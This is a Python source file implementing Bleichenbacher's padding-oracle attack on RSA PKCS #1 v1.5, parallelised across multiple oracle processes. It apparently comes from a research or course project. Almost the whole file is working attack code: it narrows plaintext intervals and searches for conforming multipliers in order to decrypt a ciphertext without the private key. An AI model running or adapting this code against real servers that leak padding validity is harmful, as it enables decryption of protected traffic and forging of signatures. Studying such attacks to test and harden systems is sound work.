import multiprocessing as mp
from query_process import query


def egcd(a, b):
    """
    Use Euclid's algorithm to find gcd of a and b
    """
    if a == 0:
        return b, 0, 1
    else:
        g, y, x = egcd(b % a, a)
        return g, x - (b // a) * y, y


def modinv(a, m):
    """
    Compute modular inverse of a over m
    """
    g, x, y = egcd(a, m)
    if g != 1:
        raise Exception('modular inverse does not exist')
    else:
        return x % m


def divceil(a, b):
    """
    Accurate division with ceil, to avoid floating point errors
    :param a: numerator
    :param b: denominator
    :return: ceil(a / b)
    """
    q, r = divmod(a, b)
    if r:
        return q + 1
    return q


def divfloor(a, b):
    """
    Accurate division with floor, to avoid floating point errors
    :param a: numerator
    :param b: denominator
    :return: floor(a / b)
    """
    q, r = divmod(a, b)
    return q


def merge_intervals(intervals):
    """
    Given a list of intervals, merge them into equivalent non-overlapping intervals
    :param intervals: list of tuples (a, b), where a <= b
    :return: list of tuples (a, b), where a <= b and a_{i+1} > b_i
    """
    intervals.sort(key=lambda x: x[0])

    merged = []
    curr = intervals[0]
    high = intervals[0][1]

    for interval in intervals:
        if interval[0] > high:
            merged.append(curr)
            curr = interval
            high = interval[1]
        else:
            high = max(high, interval[1])
            curr = (curr[0], high)
    merged.append(curr)
    return merged


def narrow_m(key, m_prev, s, B):
    """
    Step 3 of the attack
    :param key: RSA key
    :param m_prev: previous range
    :param s: s value of the current round
    :param B: 2 ** (8 * (k - 2))
    :return: New narrowed-down intervals
    """
    intervals = []
    for a, b in m_prev:
        min_r = divceil((a * s - 3 * B + 1), key.n)  # ?
        max_r = divfloor((b * s - 2 * B), key.n)  # ?
        for r in range(min_r, max_r + 1):
            start = max(a, divceil(2 * B + r * key.n, s))  # ?
            end = min(b, divfloor(3 * B - 1 + r * key.n, s))  # ?
            intervals.append((start, end))

    return merge_intervals(intervals)


class BleichAttackProcess(mp.Process):

    def __init__(self, k, key, c, oracles, num_of_rounds, queue):
        mp.Process.__init__(self)
        self.k = k
        self.key = key
        self.c = c
        self.oracles = oracles
        self.a = -1
        self.b = -1
        self.result = 0
        self.num_of_rounds = num_of_rounds
        self.queue = queue

    def run(self):
        try:
            self.bleichenbacher_attack_process(verbose=True)
            self.queue.put((self.a, self.b))
        except Exception as e:
            print(self.name, " : attack failed")
            raise e

    def bleichenbacher_attack_process(self, verbose=True):
        """
        Given an RSA public key and an oracle for conformity of PKCS #1 encryptions, along with a value c, calculate m = (c ** d) mod n
        :return: m s.t. m = (c ** d) mod n
        """

        B = 2 ** (8 * (self.k - 2))
        m = [(2 * B, 3 * B - 1)]

        self.a = m[0][0]
        self.b = m[0][1]
        i = 1
        while i <= self.num_of_rounds:
            if verbose:
                print("Round ", i, " for process :", self.name)
            if i == 1:
                s = self.find_min_conforming(divceil(self.key.n, 3 * B))
            elif len(m) > 1:
                s = self.find_min_conforming(s + 1)
            else:
                s = self.search_single_interval(B, s, self.a, self.b, self.oracles[0])

            m = narrow_m(self.key, m, s, B)
            self.a = m[0][0]
            self.b = m[0][1]
            if len(m) == 1 and m[0][0] == m[0][1]:
                self.result = m[0][0]
                break
            i += 1

    def find_min_conforming(self, min_s):
        """
        Step 2.a and 2.b of the attack
        :param min_s: minimal s to run over
        :return: smallest s >= min_s s.t. (self.c * (s ** e)) mod n represents a conforming ciphertext
        """
        counter = 0
        while True:
            #print(f'{self.name} made {counter} queries')
            min_s_list = range(min_s + (counter * len(self.oracles)), min_s + ((counter + 1) * len(self.oracles)))
            queries = list()
            for s in min_s_list:
                c = (self.c * pow(s, self.key.e, self.key.n)) % self.key.n
                queries.append(c)
            min_index = query(self.oracles, queries)
            if min_index < len(queries):
                return min_s_list[min_index]
            counter += 1

    def search_single_interval_multiprocess(self, B, prev_s, a, b):
        """
        Step 2.c of the attack
        :param B: 2 ** (8 * (k - 2))
        :param prev_s: s value of previous round
        :param a: minimum of interval
        :param b: maximum of interval
        :return: s s.t. (self.c * (s ** e)) mod n represents a conforming ciphertext
        """
        counter = 0
        r = divceil(2 * (b * prev_s - 2 * B), self.key.n)
        while True:
            query_range = range(divceil(2 * B + r * self.key.n, b),
                                divceil(3 * B + r * self.key.n, a),
                                len(self.oracles))
            for s in query_range:
                counter += 1
                queries = list()
                min_s_list = list()
                for index in range(len(self.oracles)):
                    min_s_list.append(s + index)
                    if s + index == query_range[-1]:
                        break
                for min_s in min_s_list:
                    c = (self.c * pow(min_s, self.key.e, self.key.n)) % self.key.n
                    queries.append(c)
                min_index = query(self.oracles, queries)
                if min_index < len(queries):
                    return min_s_list[min_index]
            r += 1

    def search_single_interval(self, B, prev_s, a, b, oracle):
        """
        Step 2.c of the attack
        :param B: 2 ** (8 * (k - 2))
        :param prev_s: s value of previous round
        :param a: minimum of interval
        :param b: maximum of interval
        :param oracle: oracle that checks ciphertext conformity
        :return: s s.t. (self.c * (s ** e)) mod n represents a conforming ciphertext
        """
        r = divceil(2 * (b * prev_s - 2 * B), self.key.n)
        counter = 0
        while True:
            for s in range(divceil(2 * B + r * self.key.n, b), divceil(3 * B + r * self.key.n, a)):
                counter += 1
                c = (self.c * pow(s, self.key.e, self.key.n)) % self.key.n
                if oracle.query(c):
                    return s
            r += 1
